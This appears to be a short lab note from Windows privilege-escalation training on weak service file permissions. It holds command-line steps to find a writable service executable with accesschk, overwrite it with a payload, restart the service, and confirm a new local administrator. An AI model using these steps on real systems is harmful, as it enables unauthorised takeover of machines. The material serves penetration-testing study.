# Executable Files

Windows VM

1\. Open command prompt and type:&#x20;

`C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`

`OR JUST USE PowerUp`\
Example scenario:- Notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the filepermservice.exe file.

Exploitation

Windows VM

1\. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"(JUST REPLACE THE FILES DIRECTLY RENMAE AND DELETE IT )\
2\. In command prompt type: sc start filepermsvc\
3\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
